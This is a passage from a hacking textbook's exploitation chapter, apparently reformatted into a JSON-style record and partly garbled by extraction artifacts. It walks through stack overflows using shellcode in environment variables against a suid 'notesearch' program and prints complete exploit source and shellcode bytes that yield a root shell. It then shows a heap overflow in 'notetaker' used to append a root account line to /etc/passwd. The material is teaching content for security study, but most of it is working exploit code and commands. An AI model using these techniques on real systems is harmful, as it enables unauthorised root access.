0x300\n35:*.mpg=01;35:*.mpeg=01;35:*.avi=01;35:*.fli=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;\n35:*.flac=01;35:*.mp3=01;35:*.mpc=01;35:*.ogg=01;35:*.wav=01;35:\nSSH_AUTH_SOCK=/tmp/ssh-EpSEbS7489/agent.7489\nGNOME_KEYRING_SOCKET=/tmp/keyring-AyzuEi/socket\nSESSION_MANAGER=local/hacking:/tmp/.ICE-unix/7489\nUSERNAME=reader\nDESKTOP_SESSION=default.desktop\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games\nGDM_XSERVER_LOCATION=local\nPWD=/home/reader/booksrc\nLANG=en_US.UTF-8\nGDMSESSION=default.desktop\nHISTCONTROL=ignoreboth\nHOME=/home/reader\nSHLVL=1\nGNOME_DESKTOP_SESSION_ID=Default\nLOGNAME=reader\nDBUS_SESSION_BUS_ADDRESS=unix:abstract=/tmp/dbus-\nDxW6W1OH1O,guid=4f4e0e9cc6f68009a059740046e28e35\nLESSOPEN=| /usr/bin/lesspipe %s\nDISPLAY=:0.0\nMYVAR=test\nLESSCLOSE=/usr/bin/lesspipe %s %s\nRUNNING_UNDER_GDM=yes\nCOLORTERM=gnome-terminal\nXAUTHORITY=/home/reader/.Xauthority\n_=/usr/bin/env\nreader@hacking:~/booksrc $\nSimilarly, the shellcode can be put in an environment variable, but\nfirst it needs to be in a form we can easily manipulate. The shellcode from\nthe notesearch exploit can be used; we just need to put it into a file in binary\nform. The standard shell tools of head, grep, and cut can be used to isolate just\nthe hex-expanded bytes of the shellcode.\nreader@hacking:~/booksrc $ head exploit_notesearch.c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nchar shellcode[]=\n\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"\n\"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"\n\"\\xe1\\xcd\\x80\";\nint main(int argc, char *argv[]) {\nunsigned int i, *ptr, ret, offset=270;\nreader@hacking:~/booksrc $ head exploit_notesearch.c | grep \"^\\\"\"\n\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"\n\"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"\n\"\\xe1\\xcd\\x80\";\nreader@hacking:~/booksrc $ head exploit_notesearch.c | grep \"^\\\"\" | cut -d\\\" -f2\n\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\nExploitation 143\n\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\n\\xe1\\xcd\\x80\nreader@hacking:~/booksrc $\nThe first 10 lines of the program are piped into grep, which only shows the\nlines that begin with a quotation mark. This isolates the lines containing\nthe shellcode, which are then piped into cut using options to display only the\nbytes between two quotation marks.\nBASH’s for loop can actually be used to send each of these lines to an\necho command, with command-line options to recognize hex expansion and\nto suppress adding a newline character to the end.\nreader@hacking:~/booksrc $ for i in $(head exploit_notesearch.c | grep \"^\\\"\" | cut -d\\\" -f2)\n> do\n> echo -en $i\n> done > shellcode.bin\nreader@hacking:~/booksrc $ hexdump -C shellcode.bin\n00000000 31 c0 31 db 31 c9 99 b0 a4 cd 80 6a 0b 58 51 68 |1.1.1......j.XQh|\n00000010 2f 2f 73 68 68 2f 62 69 6e 89 e3 51 89 e2 53 89 |//shh/bin..Q..S.|\n00000020 e1 cd 80 |...|\n00000023\nreader@hacking:~/booksrc $\nNow we have the shellcode in a file called shellcode.bin. This can be used\nwith command substitution to put shellcode into an environment variable,\nalong with a generous NOP sled.\nreader@hacking:~/booksrc $ export SHELLCODE=$(perl -e 'print \"\\x90\"x200')$(cat shellcode.bin)\nr(cid:0)e(cid:0)a(cid:0)de(cid:0)r(cid:0)@h(cid:0)a(cid:0)c(cid:0)ki(cid:0)n(cid:0)g:(cid:0)~(cid:0)/(cid:0)bo(cid:0)o(cid:0)k(cid:0)sr(cid:0)c(cid:0) $(cid:0) (cid:0)e(cid:0)ch(cid:0)o(cid:0) $(cid:0)S(cid:0)H(cid:0)EL(cid:0)L(cid:0)CO(cid:0)D(cid:0)E(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)\n(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)\n(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0) (cid:0) (cid:0) (cid:0)(cid:0)(cid:0)\n1 1 1 j (cid:0)(cid:0) (cid:0)(cid:0) (cid:0)(cid:0)\nXQh//shh/bin Q S\nreader@hacking:~/booksrc $\nAnd just like that, the shellcode is now on the stack in an environment\nvariable, along with a 200-byte NOP sled. This means we just need to find\nan address somewhere in that range of the sled to overwrite the saved return\naddress with. The environment variables are located near the bottom of the\nstack, so this is where we should look when running notesearch in a debugger.\nreader@hacking:~/booksrc $ gdb -q ./notesearch\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) break main\nBreakpoint 1 at 0x804873c\n(gdb) run\nStarting program: /home/reader/booksrc/notesearch\nBreakpoint 1, 0x0804873c in main ()\n(gdb)\n144 0x300\nA breakpoint is set at the beginning of main(), and the program is run.\nThis will set up memory for the program, but it will stop before anything\nhappens. Now we can examine memory down near the bottom of the stack.\n(gdb) i r esp\nesp 0xbffff660 0xbffff660\n(gdb) x/24s $esp + 0x240\n0xbffff8a0: \"\"\n0xbffff8a1: \"\"\n0xbffff8a2: \"\"\n0xbffff8a3: \"\"\n0xbffff8a4: \"\"\n0xbffff8a5: \"\"\n0xbffff8a6: \"\"\n0xbffff8a7: \"\"\n0xbffff8a8: \"\"\n0xbffff8a9: \"\"\n0xbffff8aa: \"\"\n0xbffff8ab: \"i686\"\n0xbffff8b0: \"/home/reader/booksrc/notesearch\"\n0xbffff8d0: \"SSH_AGENT_PID=7531\"\n0xbffffd56: \"SHELLCODE=\", '\\220' <repeats 190 times>...\n0xbffff9ab: \"\\220\\220\\220\\220\\220\\220\\220\\220\\220\\2201ï¿½1ï¿½1ï¿½\\231ï¿½ï¿½ï¿½\\200j\\vXQh//\nshh/bin\\211ï¿½Q\\211ï¿½S\\211ï¿½ï¿½\\200\"\n0xbffff9d9: \"TERM=xterm\"\n0xbffff9e4: \"DESKTOP_STARTUP_ID=\"\n0xbffff9f8: \"SHELL=/bin/bash\"\n0xbffffa08: \"GTK_RC_FILES=/etc/gtk/gtkrc:/home/reader/.gtkrc-1.2-gnome2\"\n0xbffffa43: \"WINDOWID=39845969\"\n0xbffffa55: \"USER=reader\"\n0xbffffa61:\n\"LS_COLORS=no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=\n40;31;01:su=37;41:sg=30;43:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01\n;31:*.taz=0\"...\n0xbffffb29:\n\"1;31:*.lzh=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.bz2=01;31:*.deb=01;31:*.rpm=01;3\n1:*.jar=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01\n;35:*.tga=0\"...\n(gdb) x/s 0xbffff8e3\n0xbffff8e3: \"SHELLCODE=\", '\\220' <repeats 190 times>...\n(gdb) x/s 0xbffff8e3 + 100\n0xbffff947: '\\220' <repeats 110 times>, \"1ï¿½1ï¿½1ï¿½\\231ï¿½ï¿½ï¿½\\200j\\vXQh//shh/bin\\\n211ï¿½Q\\211ï¿½S\\211ï¿½ï¿½\\200\"\n(gdb)\nThe debugger reveals the location of the shellcode, shown in bold above.\n(When the program is run outside of the debugger, these addresses might\nbe a little different.) The debugger also has some information on the stack,\nwhich shifts the addresses around a bit. But with a 200-byte NOP sled, these\ninconsistencies aren’t a problem if an address near the middle of the sled is\npicked. In the output above, the address 0xbffff947 is shown to be close to the\nmiddle of the NOP sled, which should give us enough wiggle room. After\ndetermining the address of the injected shellcode instructions, the exploita-\ntion is simply a matter of overwriting the return address with this address.\nExploitation 145\nreader@hacking:~/booksrc $ ./notesearch $(perl -e 'print \"\\x47\\xf9\\xff\\xbf\"x40')\n[DEBUG] found a 34 byte note for user id 999\n[DEBUG] found a 41 byte note for user id 999\n-------[ end of note data ]-------\nsh-3.2# whoami\nroot\nsh-3.2#\nThe target address is repeated enough times to overflow the return address,\nand execution returns into the NOP sled in the environment variable, which\ninevitably leads to the shellcode. In situations where the overflow buffer isn’t\nlarge enough to hold shellcode, an environment variable can be used with\na large NOP sled. This usually makes exploitations quite a bit easier.\nA huge NOP sled is a great aid when you need to guess at the target\nreturn addresses, but it turns out that the locations of environment variables\nare easier to predict than the locations of local stack variables. In C’s standard\nlibrary there is a function called getenv(), which accepts the name of an environ-\nment variable as its only argument and returns that variable’s memory address.\nThe code in getenv_example.c demonstrates the use of getenv().\ngetenv_example.c\n#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char *argv[]) {\nprintf(\"%s is at %p\\n\", argv[1], getenv(argv[1]));\n}\nWhen compiled and run, this program will display the location of a given\nenvironment variable in its memory. This provides a much more accurate\nprediction of where the same environment variable will be when the target\nprogram is run.\nreader@hacking:~/booksrc $ gcc getenv_example.c\nreader@hacking:~/booksrc $ ./a.out SHELLCODE\nSHELLCODE is at 0xbffff90b\nreader@hacking:~/booksrc $ ./notesearch $(perl -e 'print \"\\x0b\\xf9\\xff\\xbf\"x40')\n[DEBUG] found a 34 byte note for user id 999\n[DEBUG] found a 41 byte note for user id 999\n-------[ end of note data ]-------\nsh-3.2#\nThis is accurate enough with a large NOP sled, but when the same thing\nis attempted without a sled, the program crashes. This means the environ-\nment prediction is still off.\nreader@hacking:~/booksrc $ export SLEDLESS=$(cat shellcode.bin)\nreader@hacking:~/booksrc $ ./a.out SLEDLESS\nSLEDLESS is at 0xbfffff46\n146 0x300\nreader@hacking:~/booksrc $ ./notesearch $(perl -e 'print \"\\x46\\xff\\xff\\xbf\"x40')\n[DEBUG] found a 34 byte note for user id 999\n[DEBUG] found a 41 byte note for user id 999\n-------[ end of note data ]-------\nSegmentation fault\nreader@hacking:~/booksrc $\nIn order to be able to predict an exact memory address, the differences\nin the addresses must be explored. The length of the name of the program\nbeing executed seems to have an effect on the address of the environment\nvariables. This effect can be further explored by changing the name of the\nprogram and experimenting. This type of experimentation and pattern\nrecognition is an important skill for a hacker to have.\nreader@hacking:~/booksrc $ cp a.out a\nreader@hacking:~/booksrc $ ./a SLEDLESS\nSLEDLESS is at 0xbfffff4e\nreader@hacking:~/booksrc $ cp a.out bb\nreader@hacking:~/booksrc $ ./bb SLEDLESS\nSLEDLESS is at 0xbfffff4c\nreader@hacking:~/booksrc $ cp a.out ccc\nreader@hacking:~/booksrc $ ./ccc SLEDLESS\nSLEDLESS is at 0xbfffff4a\nreader@hacking:~/booksrc $ ./a.out SLEDLESS\nSLEDLESS is at 0xbfffff46\nreader@hacking:~/booksrc $ gdb -q\n(gdb) p 0xbfffff4e - 0xbfffff46\n$1 = 8\n(gdb) quit\nreader@hacking:~/booksrc $\nAs the preceding experiment shows, the length of the name of the execut-\ning program has an effect on the location of exported environment variables.\nThe general trend seems to be a decrease of two bytes in the address of the\nenvironment variable for every single-byte increase in the length of the pro-\ngram name. This holds true with the program name a.out, since the differ-\nence in length between the names a.out and a is four bytes, and the difference\nbetween the address 0xbfffff4e and 0xbfffff46 is eight bytes. This must mean\nthe name of the executing program is also located on the stack somewhere,\nwhich is causing the shifting.\nArmed with this knowledge, the exact address of the environment vari-\nable can be predicted when the vulnerable program is executed. This means\nthe crutch of a NOP sled can be eliminated. The getenvaddr.c program\nadjusts the address based on the difference in program name length to provide\na very accurate prediction.\ngetenvaddr.c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nExploitation 147\nint main(int argc, char *argv[]) {\nchar *ptr;\nif(argc < 3) {\nprintf(\"Usage: %s <environment var> <target program name>\\n\", argv[0]);\nexit(0);\n}\nptr = getenv(argv[1]); /* Get env var location. */\nptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */\nprintf(\"%s will be at %p\\n\", argv[1], ptr);\n}\nWhen compiled, this program can accurately predict where an environ-\nment variable will be in memory during a target program’s execution. This\ncan be used to exploit stack-based buffer overflows without the need for a\nNOP sled.\nreader@hacking:~/booksrc $ gcc -o getenvaddr getenvaddr.c\nreader@hacking:~/booksrc $ ./getenvaddr SLEDLESS ./notesearch\nSLEDLESS will be at 0xbfffff3c\nreader@hacking:~/booksrc $ ./notesearch $(perl -e 'print \"\\x3c\\xff\\xff\\xbf\"x40')\n[DEBUG] found a 34 byte note for user id 999\n[DEBUG] found a 41 byte note for user id 999\nAs you can see, exploit code isn’t always needed to exploit programs. The\nuse of environment variables simplifies things considerably when exploiting\nfrom the command line, but these variables can also be used to make exploit\ncode more reliable.\nThe system() function is used in the notesearch_exploit.c program to\nexecute a command. This function starts a new process and runs the com-\nmand using /bin/sh -c. The -c tells the sh program to execute commands\nfrom the command-line argument passed to it. Google’s code search can\nbe used to find the source code for this function, which will tell us more.\nGo to http://www.google.com/codesearch?q=package:libc+system to see\nthis code in its entirety.\nCode from libc-2.2.2\nint system(const char * cmd)\n{\nint ret, pid, waitstat;\nvoid (*sigint) (), (*sigquit) ();\nif ((pid = fork()) == 0) {\nexecl(\"/bin/sh\", \"sh\", \"-c\", cmd, NULL);\nexit(127);\n}\nif (pid < 0) return(127 << 8);\nsigint = signal(SIGINT, SIG_IGN);\nsigquit = signal(SIGQUIT, SIG_IGN);\nwhile ((waitstat = wait(&ret)) != pid && waitstat != -1);\nif (waitstat == -1) ret = -1;\n148 0x300\nsignal(SIGINT, sigint);\nsignal(SIGQUIT, sigquit);\nreturn(ret);\n}\nThe important part of this function is shown in bold. The fork() function\nstarts a new process, and the execl() function is used to run the command\nthrough /bin/sh with the appropriate command-line arguments.\nThe use of system() can sometimes cause problems. If a setuid program\nuses system(), the privileges won’t be transferred, because /bin/sh has been\ndropping privileges since version two. This isn’t the case with our exploit, but\nthe exploit doesn’t really need to be starting a new process, either. We can\nignore the fork() and just focus on the execl() function to run the command.\nThe execl() function belongs to a family of functions that execute com-\nmands by replacing the current process with the new one. The arguments for\nexecl() start with the path to the target program and are followed by each of\nthe command-line arguments. The second function argument is actually the\nzeroth command-line argument, which is the name of the program. The last\nargument is a NULL to terminate the argument list, similar to how a null\nbyte terminates a string.\nThe execl() function has a sister function called execle(), which has one\nadditional argument to specify the environment under which the executing\nprocess should run. This environment is presented in the form of an array of\npointers to null-terminated strings for each environment variable, and the\nenvironment array itself is terminated with a NULL pointer.\nWith execl(), the existing environment is used, but if you use execle(),\nthe entire environment can be specified. If the environment array is just the\nshellcode as the first string (with a NULL pointer to terminate the list), the\nonly environment variable will be the shellcode. This makes its address easy\nto calculate. In Linux, the address will be 0xbffffffa, minus the length of the\nshellcode in the environment, minus the length of the name of the executed\nprogram. Since this address will be exact, there is no need for a NOP sled. All\nthat’s needed in the exploit buffer is the address, repeated enough times to\noverflow the return address in the stack, as shown in exploit_nosearch_env.c.\nexploit_notesearch_env.c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\nchar shellcode[]=\n\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"\n\"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"\n\"\\xe1\\xcd\\x80\";\nint main(int argc, char *argv[]) {\nchar *env[2] = {shellcode, 0};\nunsigned int i, ret;\nExploitation 149"
  },
  {
    "input": "0x341 A Basic Heap-Based Overflow",
    "output": "char *buffer = (char *) malloc(160);\nret = 0xbffffffa - (sizeof(shellcode)-1) - strlen(\"./notesearch\");\nfor(i=0; i < 160; i+=4)\n*((unsigned int *)(buffer+i)) = ret;\nexecle(\"./notesearch\", \"notesearch\", buffer, 0, env);\nfree(buffer);\n}\nThis exploit is more reliable, since it doesn’t need a NOP sled or any\nguesswork regarding offsets. Also, it doesn’t start any additional processes.\nreader@hacking:~/booksrc $ gcc exploit_notesearch_env.c\nreader@hacking:~/booksrc $ ./a.out\n-------[ end of note data ]-------\nsh-3.2#\n0x340 Overflows in Other Segments\nBuffer overflows can happen in other memory segments, like heap and bss.\nAs in auth_overflow.c, if an important variable is located after a buffer\nvulnerable to an overflow, the program’s control flow can be altered. This\nistrue regardless of the memory segment these variables reside in; however,\nthe control tends to be quite limited. Being able to find these control points\nand learning to make the most of them just takes some experience and\ncreative thinking. While these types of overflows aren’t as standardized as\nstack-based overflows, they can be just as effective.\n0x341 A Basic Heap-Based Overflow\nThe notetaker program from Chapter 2 is also susceptible to a buffer over-\nflow vulnerability. Two buffers are allocated on the heap, and the first\ncommand-line argument is copied into the first buffer. An overflow can\noccur here.\nExcerpt from notetaker.c\nbuffer = (char *) ec_malloc(100);\ndatafile = (char *) ec_malloc(20);\nstrcpy(datafile, \"/var/notes\");\nif(argc < 2) // If there aren't command-line arguments,\nusage(argv[0], datafile); // display usage message and exit.\nstrcpy(buffer, argv[1]); // Copy into buffer.\nprintf(\"[DEBUG] buffer @ %p: \\'%s\\'\\n\", buffer, buffer);\nprintf(\"[DEBUG] datafile @ %p: \\'%s\\'\\n\", datafile, datafile);\n150 0x300\nUnder normal conditions, the buffer allocation is located at 0x804a008,\nwhich is before the datafile allocation at 0x804a070, as the debugging output\nshows. The distance between these two addresses is 104 bytes.\nreader@hacking:~/booksrc $ ./notetaker test\n[DEBUG] buffer @ 0x804a008: 'test'\n[DEBUG] datafile @ 0x804a070: '/var/notes'\n[DEBUG] file descriptor is 3\nNote has been saved.\nreader@hacking:~/booksrc $ gdb -q\n(gdb) p 0x804a070 - 0x804a008\n$1 = 104\n(gdb) quit\nreader@hacking:~/booksrc $\nSince the first buffer is null terminated, the maximum amount of data\nthat can be put into this buffer without overflowing into the next should be\n104 bytes.\nreader@hacking:~/booksrc $ ./notetaker $(perl -e 'print \"A\"x104')\n[DEBUG] buffer @ 0x804a008: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n[DEBUG] datafile @ 0x804a070: ''\n[!!] Fatal Error in main() while opening file: No such file or directory\nreader@hacking:~/booksrc $\nAs predicted, when 104 bytes are tried, the null-termination byte over-\nflows into the beginning of the datafile buffer. This causes the datafile to\nbe nothing but a single null byte, which obviously cannot be opened as a file.\nBut what if the datafile buffer is overwritten with something more than just a\nnull byte?\nreader@hacking:~/booksrc $ ./notetaker $(perl -e 'print \"A\"x104 . \"testfile\"')\n[DEBUG] buffer @ 0x804a008: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtestfile'\n[DEBUG] datafile @ 0x804a070: 'testfile'\n[DEBUG] file descriptor is 3\nNote has been saved.\n*** glibc detected *** ./notetaker: free(): invalid next size (normal): 0x0804a008 ***\n======= Backtrace: =========\n/lib/tls/i686/cmov/libc.so.6[0xb7f017cd]\n/lib/tls/i686/cmov/libc.so.6(cfree+0x90)[0xb7f04e30]\n./notetaker[0x8048916]\n/lib/tls/i686/cmov/libc.so.6(__libc_start_main+0xdc)[0xb7eafebc]\n./notetaker[0x8048511]\n======= Memory map: ========\n08048000-08049000 r-xp 00000000 00:0f 44384 /cow/home/reader/booksrc/notetaker\n08049000-0804a000 rw-p 00000000 00:0f 44384 /cow/home/reader/booksrc/notetaker\n0804a000-0806b000 rw-p 0804a000 00:00 0 [heap]\nb7d00000-b7d21000 rw-p b7d00000 00:00 0\nb7d21000-b7e00000 ---p b7d21000 00:00 0\nb7e83000-b7e8e000 r-xp 00000000 07:00 15444 /rofs/lib/libgcc_s.so.1\nb7e8e000-b7e8f000 rw-p 0000a000 07:00 15444 /rofs/lib/libgcc_s.so.1\nExploitation 151\nb7e99000-b7e9a000 rw-p b7e99000 00:00 0\nb7e9a000-b7fd5000 r-xp 00000000 07:00 15795 /rofs/lib/tls/i686/cmov/libc-2.5.so\nb7fd5000-b7fd6000 r--p 0013b000 07:00 15795 /rofs/lib/tls/i686/cmov/libc-2.5.so\nb7fd6000-b7fd8000 rw-p 0013c000 07:00 15795 /rofs/lib/tls/i686/cmov/libc-2.5.so\nb7fd8000-b7fdb000 rw-p b7fd8000 00:00 0\nb7fe4000-b7fe7000 rw-p b7fe4000 00:00 0\nb7fe7000-b8000000 r-xp 00000000 07:00 15421 /rofs/lib/ld-2.5.so\nb8000000-b8002000 rw-p 00019000 07:00 15421 /rofs/lib/ld-2.5.so\nbffeb000-c0000000 rw-p bffeb000 00:00 0 [stack]\nffffe000-fffff000 r-xp 00000000 00:00 0 [vdso]\nAborted\nreader@hacking:~/booksrc $\nThis time, the overflow is designed to overwrite the datafile buffer with\nthe string testfile. This causes the program to write to testfile instead of\n/var/notes, as it was originally programmed to do. However, when the heap\nmemory is freed by the free() command, errors in the heap headers are\ndetected and the program is terminated. Similar to the return address\noverwrite with stack overflows, there are control points within the heap\narchitecture itself. The most recent version of glibc uses heap memory\nmanagement functions that have evolved specifically to counter heap\nunlinking attacks. Since version 2.2.5, these functions have been rewritten\ntoprint debugging information and terminate the program when they\ndetect problems with the heap header information. This makes heap\nunlinking in Linux very difficult. However, this particular exploit doesn’t\nuseheap header information to do its magic, so by the time free() is called,\ntheprogram has already been tricked into writing to a new file with root\nprivileges.\nreader@hacking:~/booksrc $ grep -B10 free notetaker.c\nif(write(fd, buffer, strlen(buffer)) == -1) // Write note.\nfatal(\"in main() while writing buffer to file\");\nwrite(fd, \"\\n\", 1); // Terminate line.\n// Closing file\nif(close(fd) == -1)\nfatal(\"in main() while closing file\");\nprintf(\"Note has been saved.\\n\");\nfree(buffer);\nfree(datafile);\nreader@hacking:~/booksrc $ ls -l ./testfile\n-rw------- 1 root reader 118 2007-09-09 16:19 ./testfile\nreader@hacking:~/booksrc $ cat ./testfile\ncat: ./testfile: Permission denied\nreader@hacking:~/booksrc $ sudo cat ./testfile\n?\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAtestfile\nreader@hacking:~/booksrc $\n152 0x300\nA string is read until a null byte is encountered, so the entire string is\nwritten to the file as the userinput. Since this is a suid root program, the file\nthat is created is owned by root. This also means that since the filename can\nbe controlled, data can be appended to any file. This data does have some\nrestrictions, though; it must end with the controlled filename, and a line with\nthe user ID will be written, also.\nThere are probably several clever ways to exploit this type of capability.\nThe most apparent one would be to append something to the /etc/passwd\nfile. This file contains all of the usernames, IDs, and login shells for all the\nusers of the system. Naturally, this is a critical system file, so it is a good idea\nto make a backup copy before messing with it too much.\nreader@hacking:~/booksrc $ cp /etc/passwd /tmp/passwd.bkup\nreader@hacking:~/booksrc $ head /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/bin/sh\nman:x:6:12:man:/var/cache/man:/bin/sh\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\nmail:x:8:8:mail:/var/mail:/bin/sh\nnews:x:9:9:news:/var/spool/news:/bin/sh\nreader@hacking:~/booksrc $\nThe fields in the /etc/passwd file are delimited by colons, the first field\nbeing for login name, then password, user ID, group ID, username, home\ndirectory, and finally the login shell. The password fields are all filled with\nthe x character, since the encrypted passwords are stored elsewhere in a\nshadow file. (However, this field can contain the encrypted password.)\nInaddition, any entry in the password file that has a user ID of 0 will be given\nroot privileges. That means the goal is to append an extra entry with\nbothroot privileges and a known password to the password file.\nThe password can be encrypted using a one-way hashing algorithm.\nBecause the algorithm is one way, the original password cannot be recreated\nfrom the hash value. To prevent lookup attacks, the algorithm uses a salt\nvalue, which when varied creates a different hash value for the same input\npassword. This is a common operation, and Perl has a crypt() function that\nperforms it. The first argument is the password, and the second is the salt\nvalue. The same password with a different salt produces a different salt.\nreader@hacking:~/booksrc $ perl -e 'print crypt(\"password\", \"AA\"). \"\\n\"'\nAA6tQYSfGxd/A\nreader@hacking:~/booksrc $ perl -e 'print crypt(\"password\", \"XX\"). \"\\n\"'\nXXq2wKiyI43A2\nreader@hacking:~/booksrc $\nNotice that the salt value is always at the beginning of the hash. When a\nuser logs in and enters a password, the system looks up the encrypted password\nExploitation 153\nfor that user. Using the salt value from the stored encrypted password, the\nsystem uses the same one-way hashing algorithm to encrypt whatever text\nthe user typed as the password. Finally, the system compares the two hashes;\nif they are the same, the user must have entered the correct password. This\nallows the password to be used for authentication without requiring that the\npassword be stored anywhere on the system.\nUsing one of these hashes in the password field will make the password\nfor the account be password, regardless of the salt value used. The line to\nappend to /etc/passwd should look something like this:\nmyroot:XXq2wKiyI43A2:0:0:me:/root:/bin/bash\nHowever, the nature of this particular heap overflow exploit won’t allow\nthat exact line to be written to /etc/passwd, because the string must end with\n/etc/passwd. However, if that filename is merely appended to the end of\nthe entry, the passwd file entry would be incorrect. This can be compensated\nfor with the clever use of a symbolic file link, so the entry can both end with\n/etc/passwd and still be a valid line in the password file. Here’s how it works:\nreader@hacking:~/booksrc $ mkdir /tmp/etc\nreader@hacking:~/booksrc $ ln -s /bin/bash /tmp/etc/passwd\nreader@hacking:~/booksrc $ ls -l /tmp/etc/passwd\nlrwxrwxrwx 1 reader reader 9 2007-09-09 16:25 /tmp/etc/passwd -> /bin/bash\nreader@hacking:~/booksrc $\nNow /tmp/etc/passwd points to the login shell /bin/bash. This means\nthat a valid login shell for the password file is also /tmp/etc/passwd, making\nthe following a valid password file line:\nmyroot:XXq2wKiyI43A2:0:0:me:/root:/tmp/etc/passwd\nThe values of this line just need to be slightly modified so that the portion\nbefore /etc/passwd is exactly 104 bytes long:\nreader@hacking:~/booksrc $ perl -e 'print \"myroot:XXq2wKiyI43A2:0:0:me:/root:/tmp\"' | wc -c\n38\nreader@hacking:~/booksrc $ perl -e 'print \"myroot:XXq2wKiyI43A2:0:0:\" . \"A\"x50 . \":/root:/tmp\"'\n| wc -c\n86\nreader@hacking:~/booksrc $ gdb -q\n(gdb) p 104 - 86 + 50\n$1 = 68\n(gdb) quit\nreader@hacking:~/booksrc $ perl -e 'print \"myroot:XXq2wKiyI43A2:0:0:\" . \"A\"x68 . \":/root:/tmp\"'\n| wc -c\n104\nreader@hacking:~/booksrc $\nIf /etc/passwd is added to the end of that final string (shown in bold), the\nstring above will be appended to the end of the /etc/passwd file. And since\nthis line defines an account with root privileges with a password we set, it won’t\n154 0x300\nbe difficult to access this account and obtain root access, as the following\noutput shows.\nreader@hacking:~/booksrc $ ./notetaker $(perl -e 'print \"myroot:XXq2wKiyI43A2:0:0:\" . \"A\"x68 .\n\":/root:/tmp/etc/passwd\"')\n[DEBUG] buffer @ 0x804a008: 'myroot:XXq2wKiyI43A2:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/root:/tmp/etc/passwd'\n[DEBUG] datafile @ 0x804a070: '/etc/passwd'\n[DEBUG] file descriptor is 3\nNote has been saved.\n*** glibc detected *** ./notetaker: free(): invalid next size (normal): 0x0804a008 ***\n======= Backtrace: 